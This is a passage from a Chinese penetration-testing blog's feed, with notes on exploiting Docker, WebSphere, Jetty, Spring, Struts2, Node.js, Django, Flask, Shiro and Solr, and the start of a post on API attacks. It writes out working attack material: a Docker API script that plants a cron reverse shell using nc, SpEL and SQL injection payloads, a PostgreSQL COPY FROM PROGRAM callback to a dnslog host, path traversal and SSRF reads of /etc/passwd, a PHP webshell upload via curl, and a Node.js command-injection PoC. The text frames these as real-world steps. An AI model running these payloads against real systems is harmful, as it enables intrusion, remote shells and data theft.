配置文件，进行反弹 shell。2375 端口开放，并且未授权。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import docker</span><br><span class=\"line\">client = docker.DockerClient(base_url=&#x27;http://your-ip:2375/&#x27;)</span><br><span class=\"line\">data = client.containers.run(&#x27;alpine:latest&#x27;, r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;, remove=True, volumes=&#123;&#x27;/etc&#x27;: &#123;&#x27;bind&#x27;: &#x27;/tmp/etc&#x27;, &#x27;mode&#x27;: &#x27;rw&#x27;&#125;&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"websphere-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#websphere-反序列化\">#</a> websphere 反序列化</h4>\n<p>WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快 速交付创新的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰富 的编程模型中进行选择，更好地协调项目需求与编程模型功能和开发人员技能。</p>\n<p>端口：9080—web (http) 应用访问端口、9443—web (https) 应用访问端口、 9060— 管理后台访问端口、9043— 管理控制台安全端口、8880—SOAP 连接器 端口等等。漏洞探测在 8880 端口，后台是 9060 端口，解析是 9080 端口。</p>\n<ul>\n<li>CVE-2015-7450</li>\n</ul>\n<p>后台弱口令上传 webshell，在 6.x 至 7.0 版本，后台登陆只需要输入 admin 作为用户标 识，无需密码，即可登陆后台。其他版本可以尝试 websphere 的默认密码。后台存在文 件上传点，同 tomcat 一样，可用哥斯拉导出 jsp 后门压缩为 zip 后改为 war，再后台上传 并运行。设定目录之后直接解析为 jsp 文件，连接到 webshell。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull iscrosales/websphere7</span><br><span class=\"line\">docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7</span><br><span class=\"line\">CVE-2015-7450 反序列化 可命令执行直接用exp执行命令</span><br></pre></td></tr></table></figure>\n<ul>\n<li>CVE-2020-4450 无利用 POC/EXP</li>\n</ul>\n<h4 id=\"jetty-文件读取\"><a class=\"markdownIt-Anchor\" href=\"#jetty-文件读取\">#</a> jetty 文件读取</h4>\n<p>Elipse Jetty 是一个开源的 servlet 容器，它为基于 Java 的 Web 容器提供运行 环境。此中间件存在文件读取漏洞，但是读取的信息用处不大。</p>\n<p>CVE-2021-28164 <span class=\"exturl\" data-url=\"aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvJTJlL1dFQi1JTkYvd2ViLnhtbA==\">http://123.58.236.76:63126/./WEB-INF/web.xml</span></p>\n<p>CVE-2021-28169 <span class=\"exturl\" data-url=\"aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvc3RhdGljPy9XRUItSU5GL3dlYi54bWw=\">http://123.58.236.76:63126/static?/WEB-INF/web.xml</span></p>\n<p>CVE-2021-34429 <span class=\"exturl\" data-url=\"aHR0cDovLzEyMy41OC4yMzYuNzY6NjMxMjYvJTI1dTAwMmUvV0VCLUlORi93ZWIueG1s\">http://123.58.236.76:63126/%u002e/WEB-INF/web.xml</span></p>\n<h3 id=\"框架安全\"><a class=\"markdownIt-Anchor\" href=\"#框架安全\">#</a> 框架安全</h3>\n<p>根据插件及数据包中识别框架，但是不一定准确，多识别几次确定。</p>\n<h4 id=\"thinkphp-laravel\"><a class=\"markdownIt-Anchor\" href=\"#thinkphp-laravel\">#</a> Thinkphp Laravel</h4>\n<p>当确定是 php 框架，直接用集成化工具一把梭。就是一个收集信息，确定 此版本下的漏洞，寻找工具直接利用的一个过程。可以用 GUI_tools 测试。</p>\n<p>Laravel &lt;= 8.4.2 存在 CVE-2021-3129 RCE</p>\n<p>Thinkphp-3.X RCE-5.X RCE 存在 RCE 框架的漏洞是固定的，没有就是没有，自己去挖也不太现实，只能把注意力放在其他的财产目标上；其他的也没漏洞那就只能去社工、钓鱼从管理方面 下手了。</p>\n<h4 id=\"spring-struts2\"><a class=\"markdownIt-Anchor\" href=\"#spring-struts2\">#</a> Spring Struts2</h4>\n<p>在 java 代码漏洞利用中，需要注意要使用 base64 编码来反弹 shell。原因是 由于 Runtime.getRuntime ().exec () 中不能使用管道符等 bash 需要的方法，故需要 用进行一次编码。</p>\n<p>（1）St2 漏洞</p>\n<p>2020 前漏洞，当识别到一个 url 地址后缀是 action 结尾，就可以尝试用 St2 的集成化工具测试直接 getshell; 后面的版本修复了此漏洞，但有 s2-062 存在 cve_2020_17530、cve_2021_31805，可以直接利用脚本 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lhbk11\">https://github.com/YanMu</span> 2020/s2-062 实现 RCE。关于原理与手工复现还是有一定难度的，应该是尽快确 定此框架存在漏洞直接利用。</p>\n<p>（2）Spring 漏洞</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NwcmluZy8lRTMlODAlODI=\">https://vulhub.org/#/environments/spring/。</span></p>\n<p>cve_2017_4971-Spring Web Flow-<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMyMi8lRTUlQTQlQTclRTglODclQjQlRTYlOTglQUYlRTklODAlOUElRTglQkYlODdTcHJpbmclRTUlOUMlQTg=\">https://paper.seebug.org/322 / 大致是通过 Spring 在</span> 17 年的默认页面进行操作从而 RCE</p>\n<p>cve_2018_1273-Spring DataCommons - <span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NwcmluZy9DVkUtMjAxOC0xMjczLw==\">https://vulhub.org/#/environments/spring/CVE-2018-1273/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击者可以注入恶意 SpEL表达式以执行任意命令，在用户注册界面抓包修改数据，注意不好判断是否RCE，需要dnslog测试/代码全部编码/反弹shell命令编码都进行测试。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">命令注入编码时需要拿出去单独编码防止空格的干扰</span></span><br><span class=\"line\"><span class=\"meta prompt_\">username[#</span><span class=\"language-bash\">this.getClass().forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>).getRuntime().<span class=\"built_in\">exec</span>(<span class=\"string\">&quot;touch /tmp/success&quot;</span>)]=&amp;password=&amp;repeatedPassword=</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273 ）</span></span><br><span class=\"line\">https://vulhub.org/#/environments/spring/CVE-2022-22963/</span><br><span class=\"line\">Connection: close spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;)</span><br><span class=\"line\">抓包修改要执行的命令，注意此处不需要编码，其不在post数据中</span><br></pre></td></tr></table></figure>\n<h4 id=\"nodejs-jquery\"><a class=\"markdownIt-Anchor\" href=\"#nodejs-jquery\">#</a> Node.js Jquery</h4>\n<p>（1）Node.js 目录穿越漏洞（CVE-2017-14849 ）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">复现地址：</span></span><br><span class=\"line\">https://vulhub.org/#/environments/node/CVE-2017-14849/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用来读取一些敏感文件：</span></span><br><span class=\"line\">GET /static/../../../a/../../../../etc/passwd HTTP/1.1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在node.js &lt;= 8 .5存在此漏洞，如果版本高就不用测了，版本找不到可以直接测</span></span><br></pre></td></tr></table></figure>\n<p>（2）node.js CVE_2021_21315</p>\n<p>Node.js-systeminformation 是用于获取各种系统信息的 Node.js 模块，在存在命令注入漏洞的版本中，可以通过未过滤的参数中注入 payload 执行系统命令。<br>\nSysteminformation &lt; 5.3.1</p>\n<p>复现地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yODQzNTAuaHRtbA==\">https://www.freebuf.com/vuls/284350.html</span></p>\n<p><code>git clone https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git &amp;&amp; node index.js /api/getServices?name[]=$(echo -e 'xiaodi' &gt; test.txt)</code></p>\n<p>（3）jQuery cve_2018_9207 cve_2018_9208 cve_2018_9209</p>\n<p>jQuery 是一个快速、简洁的 JavaScript 框架，如果与 php 配合使用且采用 jq 来传文件，当 jQuery Upload File &lt;= 4.0.2 满足时存在任意文件上传，向 jq 中 post php 可 RCE:<br>\n <code>curl -F &quot;myfile=@php.php&quot; &quot;http://123.58.236.76:56579/jquery-upload-file/php/upload.php&quot;</code></p>\n<h4 id=\"django-flask\"><a class=\"markdownIt-Anchor\" href=\"#django-flask\">#</a> Django Flask</h4>\n<p>Django 是一款广为流行的开源 web 框架，由 Python 编写，许多网站和 app 都基于 Django 开发。Django 采用了 MTV 的框架模式，即模型 M，视图 V 和模 版 T，使用 Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱 动的应用程序。而且 Django 还包含许多功能强大的第三方插件，使得 Django 具 有较强的可扩展性。</p>\n<p>前期的信息收集是很重要的，收集到的信息越多，暴露的资产面就越多， 搜集到的框架是 diango 的话就可以着手搜它历年爆出来的 RCE 尝试利用。</p>\n<p>（1）django cve_2019_14234</p>\n<p>注意触发此漏洞的前提条件是需要拿到后台权限，如果不能凭借弱口令或者爆破进入后台，那就不能利用这个漏洞了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">单引号已注入成功，SQL语句报错</span></span><br><span class=\"line\">/admin/vuln/collection/?detail__a%27b=123</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建cmd_exec</span></span><br><span class=\"line\">/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)--%20</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">调用cmd_exec执行命令，用dnslog接收回显判断是否存在命令执行：</span></span><br><span class=\"line\">/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27--%20</span><br></pre></td></tr></table></figure>\n<p>（2）django CVE-2021-35042</p>\n<p>漏洞复现：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yODMyNjIuaHRtbA==\">https://www.freebuf.com/vuls/283262.html</span></p>\n<p>Django 组件存在 SQL 注入漏洞，该漏洞是由于对 QuerySet.order_by () 中用户提供数据的过滤不足，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行 SQL 注入攻击，最终造成服务器敏感信息泄露。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找到可以进行数据注入的地方，进行构造，直接注入获取敏感信息。</span></span><br><span class=\"line\">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23</span><br><span class=\"line\">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23</span><br><span class=\"line\">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23</span><br></pre></td></tr></table></figure>\n<p>（3）Django SQL 注入漏洞 CVE-2022-28346</p>\n<p>攻击者使用精心编制的字典， 通过 kwargs 传递给 QuerySet.annotate ()、aggregate () 和 extra () 这些方法，可导致这些方法在列别名中受到 SQL 注入攻击。</p>\n<p>漏洞复现：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NzU2NzY1NS9hcnRpY2xlL2RldGFpbHMvMTI1NjIzNzg0\">https://blog.csdn.net/weixin_57567655/article/details/125623784</span></p>\n<p>通过报错页面可以发现存在哪些接口，访问接口如果存在传参，同样会提示报错信息</p>\n<p>使用报错提示的参数进行 sql 注入：<br>\n <code>http://x.x.x.x:8000/demo?field=demo.name&quot;FROM &quot;demo_user&quot; union SELECT &quot;1&quot;,sqlite_version(),&quot;3&quot; --</code></p>\n<p>（4）flask SSTI 模板注入</p>\n<p>复现地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2ZsYXNrL3NzdGkv\">https://vulhub.org/#/environments/flask/ssti/</span></p>\n<p>访问 http://your-ip/?name=54289，得到 54289 ，说明 SSTI 漏洞存在。</p>\n<p>可尝试执行命令，反弹 shell 等操作。一般参数为默认的 404_url 和 name，如果无法确定参数的话需要用字典进行测试。</p>\n<h4 id=\"shiro-sorl\"><a class=\"markdownIt-Anchor\" href=\"#shiro-sorl\">#</a> Shiro Sorl</h4>\n<p>（1）Apache Shiro 漏洞</p>\n<p>Apache Shiro 是一个强大且易用的 Java 安全框架，用于身份验证、授权、密码和会话管理。</p>\n<p>判断：大多会发生在登录处，返回包里包含 remeberMe=deleteMe 字段</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">apache shiro的历史漏洞如下，作简单了解：</span></span><br><span class=\"line\">Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483 】</span><br><span class=\"line\">Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807 】</span><br><span class=\"line\">Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442 】</span><br><span class=\"line\">Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957 】</span><br><span class=\"line\">Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989 】</span><br><span class=\"line\">Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933 】</span><br><span class=\"line\">Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523 】</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>CVE_2016_4437 Shiro-550+Shiro-721<br>\n 用工具直接爆破出密钥，在继续执行命令，但是已经很老，很难碰到</p>\n</li>\n<li>\n<p>CVE-2020-11989<br>\nPoc：/admin/%20 影响范围：Apache Shiro &lt; 1.7.1<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L3NoaXJvLWN2ZS0yMDIwLTE3NTIz\">https://github.com/jweny/shiro-cve-2020-17523</span><br>\n 当看到当前 java 引入了 shiro 依赖，切其版本在指定范围内就可以进行测试</p>\n</li>\n<li>\n<p>CVE-2020-1957<br>\nPoc：/xxx/…;/admin/ 影响范围：Apache Shiro &lt; 1.5.3<br>\n 验证绕过，访问构造的地址构造恶意 url 地址之后可以跳过登录认证，如何获取这个 url 地址可以拿到源码构造可以在线搜索或者抓包进行寻找。实际出现了 shiro 这个版本再去想找相应的利用方法。</p>\n</li>\n</ul>\n<p>（2）Apache Solr 漏洞</p>\n<p>Apache Solr 是一个开源的搜索服务，使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现的。Solr 是一个高性能，采用 Java5 开发，基于 Lucene 的全文搜索服务器。</p>\n<p>漏洞判断：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hdmQuYWxpeXVuLmNvbS9zZWFyY2g/cT1zb2xy\">https://avd.aliyun.com/search?q=solr</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">apache solr的历史漏洞如下，作简单了解：</span></span><br><span class=\"line\">远程命令执行RCE（CVE-2017-12629 ）</span><br><span class=\"line\">远程命令执行XXE（CVE-2017-12629 ）</span><br><span class=\"line\">任意文件读取AND命令执行（CVE-2019-17558 ）</span><br><span class=\"line\">远程命令执行漏洞(CVE-2019-0192)</span><br><span class=\"line\">远程命令执行漏洞(CVE-2019-0193)</span><br><span class=\"line\">未授权上传漏洞(CVE-2020-13957)</span><br><span class=\"line\">Apache Solr SSRF (CVE-2021-27905)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>CVE-2017-12629 远程命令执行 RCE</li>\n</ul>\n<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过 Http 利用 XML 加到一 个搜索集合中。查询该集合也是通过 http 收到一个 XML/JSON 响应来实现。此 次 7.1.0 之前版本总共爆出两个漏洞：XML 实体扩展漏洞 (XXE) 和远程命令执行漏洞 (RCE)，二者可以连接成利用链，编号均为 CVE-2017-12629。</p>\n<p>漏洞复现:<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvQ1ZFLTIwMTctMTI2MjktUkNFLw==\">https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/</span></p>\n<p>Apache solr&lt;7.1.0 版本，直接通过 burp 抓包修改数据即可</p>\n<ul>\n<li>CVE-2019-17558 Apache Solr Velocity 注入远程命令执行漏洞</li>\n</ul>\n<p>Apache Solr 是一个开源的搜索服务器。在其 5.0.0 到 8.3.1 版本中，用户可以注入自定义模板，通过 Velocity 模板语言执行任意命令。</p>\n<p>漏洞复现:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vc29scl9yY2U=\">https://github.com/jas502n/solr_rce</span><br>\n 漏洞说明:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvc29sci9DVkUtMjAxOS0xNzU1OC9SRUFETUUuemgtY24ubWQ=\">https://github.com/vulhub/vulhub/blob/master/solr/CVE-2019-17558/README.zh-cn.md</span></p>\n<p><code>D:\\Python27\\python.exe solr_rce.py http://123.58.236.76:50847 id</code></p>\n<p><strong>在实战中，当发现有 Solr 资产时，可直接通过脚本测试，没有就是没有</strong></p>\n<ul>\n<li>CVE-2019-0193 Apache Solr 远程命令执行漏洞</li>\n</ul>\n<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基<br>\n于 HTTP 和 Apache Lucene 实现。此次漏洞出现在 Apache Solr 的 DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源 中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构 造危险的请求，从而造成远程命令执行。</p>\n<p>漏洞复现:<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvQ1ZFLTIwMTktMDE5My8=\">https://vulhub.org/#/environments/solr/CVE-2019-0193/</span></p>\n<p>有两个前提条件，一个是有未授权或者弱密码可以进入后台，二是后台里边已经创建过一个模板，如果满足，可以修改再后台用 debug 模式调整 dataConfig 的代码，加入反弹 shell 的命令即可利用</p>\n<ul>\n<li>CVE-2021-27905 Apache Solr RemoteStreaming 文件读取与 SSRF 漏洞</li>\n</ul>\n<p>Apache Solr 是一个开源的搜索服务器。在 Apache Solr 未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成 SSRF 或任意文件读取。</p>\n<p>漏洞复现: <span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvUmVtb3RlLVN0cmVhbWluZy1GaWxlcmVhZC8=\">https://vulhub.org/#/environments/solr/Remote-Streaming-Fileread/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">最后获取信息的 payload 如下</span></span><br><span class=\"line\">curl-i -s -k&#x27;http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可以调整file协议为其他协议如http，通过访问dnslog来验证漏洞存在</span></span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/",
            "title": "XD22 4 API 攻防",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"接口分类\"><a class=\"markdownIt-Anchor\" href=\"#接口分类\">#</a> 接口分类</h3>\n<p>SOAP (Simple Object Access Protocol) 简单对象访问协议是交换数据的一 种协议规范，是一种轻量的、简单的、基于 XML (标准通用标记语言下的一个 子集) 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。SOAP 不是 Web Service 的专有协议。SOAP 使用 HTTP 来发送 XML 格式的数据，可以简单 理解为：SOAP = HTTP +XML。</p>\n<p>REST (Representational State Transfer) 即表述性状态传递，在三种主流的 Web 服务实现方案中，因为 REST 模式的 Web 服务与复杂的 SOAP 和 XML-RPC 对比来讲明显的更加简洁，越来越多的 Web 服务开始采用 REST 风格设计和实 现。例如，<span class=\"exturl\" data-url=\"aHR0cDovL0FtYXpvbi5jb20=\">Amazon.com</span> 提供接近 REST 风格的 Web 服务进行图书查找；雅虎提 供的 Web 服务也是 REST 风格的。</p>\n<p>WSDL (Web Services Description Language) 即网络服务描述语言，用于描 述 Web 服务的公共接口。这是一个基于 XML 的关于如何与 Web 服务通讯和使 用的服务描述；也就是描述与目录中列出的 Web 服务进行交互时需要绑定的协 议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候 再将实际的网络协议和信息格式绑定给该服务。</p>\n<p>++ 注意 soap、rest、wsdl 属于 webservice 类</p>\n<h4 id=\"webservice类-wsdl\"><a class=\"markdownIt-Anchor\" href=\"#webservice类-wsdl\">#</a> Webservice 类 wsdl</h4>\n<p>探针：?wsdl<br>\n 搜索：inurl:aspx?wsdl、inurl:php?wsdl、<span class=\"exturl\" data-url=\"aHR0cDovL2VkdS5jbg==\">edu.cn</span> inurl:asmx?wsdl<br>\n 利用：SoapUI 或者 ReadyAPI</p>\n<p>接口处有很多功能，每一个功能通过输入一些信息都会有相应的信息返回， 可以读取敏感信息泄漏，利用 SoapUI 和 ReadyAPI 通过获取到的 wsdl 接口即 xml 语言的页面自动发送 payload 测试有无安全漏洞。</p>\n<p>通过 ReadyAPI 测试接口需要一段时间，但是测试的比较全面，而且可以导 出报告，可以根据此报告查看此接口中含有哪些漏洞，如果跑出来 sql 注入可以 直接用 sqlmap 跑一下。</p>\n<p>常规网站全方位扫描工具只能发现这个地址，从这个地址的 url 地址加上参数测试，但是不会从这个地址显示出来的页面上测试漏洞，所有与常规的 web 测试不太相同，需要借助其他的工具。</p>\n<h4 id=\"soap类-swagger\"><a class=\"markdownIt-Anchor\" href=\"#soap类-swagger\">#</a> Soap 类 swagger</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">探针：可通过页面数据包或目录结构中查看有没有以下目录</span></span><br><span class=\"line\">/swagger、/api/swagger、/swagger/ui、/api/swagger/ui</span><br><span class=\"line\">/swagger-ui.html、/api/swagger-ui.html、/user/swagger-ui.html</span><br><span class=\"line\">/libs/swaggerui、/api/swaggerui、/swagger-resources/configuration/ui</span><br><span class=\"line\">/swagger-resources/configuration/security</span><br></pre></td></tr></table></figure>\n<p>工具一：可利用 SoapUI 导入 swagger 并解析此文件，SoapUI 工具测是使用 需要 swagger.json 的 url 地址，此地址包含其下的所有的页面中链接信息及配置 信息，但是此工具只能用来测试此接口是不是好的，不能测试到其安全问题。</p>\n<p>工具二:  <code>https://github.com/jayus0821/swagger-hack</code> , 自动化爬取并自动测试 所有 swagger 接口，可使用 api-docs 或者 swagger.json 文件来测试，分析生成的 csv 查看有无敏感信息返回。一些接口处是可以获取到用户名和密码的，可以存 起来用来枚举此网站上的其他资源。</p>\n<p>手工：查看网站上每一个 swagger 所提供的接口的具体的功能，改变相应的 参数看能有什么效果，测试接口功能得到相应信息。</p>\n<p>其他工具:  <code>https://github.com/lijiejie/swagger-exp</code> ，也可以再需要的时候去搜集工具。</p>\n<h4 id=\"http类-webpack\"><a class=\"markdownIt-Anchor\" href=\"#http类-webpack\">#</a> Http 类 Webpack</h4>\n<p>webpack 是代码编译工具，有入口、出口、loader 和插件。webpack 是一 个用于现代 JavaScript 应用程序的静态模块打包工具。当 webpack 处理应用程 序时，它会在内部构建一个依赖图 (dependency graph)，此依赖图对应映射到项 目所需的每个模块，并生成一个或多个 bundle</p>\n<p>探针：插件识别或者数据包中的 js 文件看有没有 webpack<br>\n 工具：PackerFuzzer-&gt; <code>https://github.com/rtcatc/Packer-Fuzzer</code> <br>\nPacker Fuzzer 是一种快速高效的扫描器，用于对由 javascript 模块捆绑器 (如 Webpack) 构建的网站进行安全检测。可以提取 js 中的代码，用来生成一 份报告，查看 js 中有没有相关的安全漏洞。</p>\n<p>在 WEB 前端打包打包，在渗透、安全服务中的网站是否会出现更多的 Webpack 打包器似调用，这也便于我们快速完成网站的和 API 清单，但发现这些 JS 打包器所生成的文件之多，并且代码异常量异常多的测试功能给我们提供 了很多上万行的手动功能带来了极大的不便，Packer Fuzzer 软件应运而生。</p>\n<p>自动模糊提取目标站点参数，以及对本内容的 API，以及对内容支持 API 的未授权访问：对内容支持的 API 进行 CORS、SQL 注入、越过、授权、任意文件上传大模糊高效在扫描，本工具还支持自动生成扫描报告，您可以选择方 便分析之后的 HTML 版本以及较正规的 doc、pdf、txt 版本。</p>\n<h3 id=\"dvws鉴权-xxe利用\"><a class=\"markdownIt-Anchor\" href=\"#dvws鉴权-xxe利用\">#</a> DVWS 鉴权 XXE 利用</h3>\n<h4 id=\"dvws-鉴权\"><a class=\"markdownIt-Anchor\" href=\"#dvws-鉴权\">#</a> Dvws 鉴权</h4>\n<p>下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Nub29weXNlY3VyaXR5L2R2d3Mtbm9kZQ==\">https://github.com/snoopysecurity/dvws-node</span></p>\n<p>抓取数据包进行测试，在页面中点击 admin 的时候会有一闪而过的情况， 分析处会判断当前的用户的 admin 字段是否是 true，如果不是不允许进入特定页 面。可以进行注册时的数据包修改，添加 admin 字段并设置为 true，再次进入特 定页面时发现越权成功。实际上也可以按照这个思路去测试一些鉴权问题是否 存在。</p>\n<h4 id=\"dvws-xxe漏洞\"><a class=\"markdownIt-Anchor\" href=\"#dvws-xxe漏洞\">#</a> Dvws XXE 漏洞</h4>\n<p>利用 burp 的 http.history 模式，一顿前端上的接口操作之后，查看有没有特 殊的数据包。排查之后发现了一个如下 soap 的接口，并且是以 xml 语言进行传 输的，那么这种情况下就可以测试 xxe 漏洞，通过 file 协议读取敏感文件。但是 xxe 漏洞一般都是没有回显的，可以配合无回显利用加载远程 dtd 文件或者 dnslog 